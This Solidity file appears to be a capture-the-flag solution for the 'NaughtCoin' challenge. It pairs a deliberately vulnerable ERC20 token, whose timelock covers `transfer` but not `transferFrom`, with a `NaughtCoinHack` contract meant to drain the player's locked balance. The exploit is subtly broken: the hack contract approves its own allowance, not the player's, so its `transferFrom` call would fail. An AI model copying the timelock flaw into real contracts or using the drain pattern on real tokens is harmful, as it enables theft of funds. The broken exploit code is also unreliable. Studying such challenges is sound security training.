 // SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/solc-0.6/contracts/token/ERC20/ERC20.sol';

/**
	ERC20 has other ways to tranfer tokens, use that method to transfer all the tokens

	Remember to first approve the tokens to other address to send the tokens using
	`transferFrom` fn.
 */

contract NaughtCoin is ERC20 {

  // string public constant name = 'NaughtCoin';
  // string public constant symbol = '0x0';
  // uint public constant decimals = 18;
  uint public timeLock = now + 10 * 365 days;
  uint256 public INITIAL_SUPPLY;
  address public player;

  constructor(address _player)
  ERC20('NaughtCoin', '0x0')
  public {
    player = _player;
    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));
    // _totalSupply = INITIAL_SUPPLY;
    // _balances[player] = INITIAL_SUPPLY;
    _mint(player, INITIAL_SUPPLY);
    emit Transfer(address(0), player, INITIAL_SUPPLY);
  }

  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {
    super.transfer(_to, _value);
  }

  // Prevent the initial owner from transferring tokens until the timelock has passed
  modifier lockTokens() {
    if (msg.sender == player) {
      require(now > timeLock);
      _;
    } else {
     _;
    }
  }
}

contract NaughtCoinHack {
  NaughtCoin private nc;

  constructor(address ncAdd) public {
    nc = NaughtCoin(ncAdd);
  }

  function transferHack() public {
    nc.approve(address(this), nc.INITIAL_SUPPLY());
    nc.transferFrom(nc.player(), address(this), nc.INITIAL_SUPPLY());
  }

  function initialSupply() public view returns (uint256) {
    return nc.INITIAL_SUPPLY();
  }
}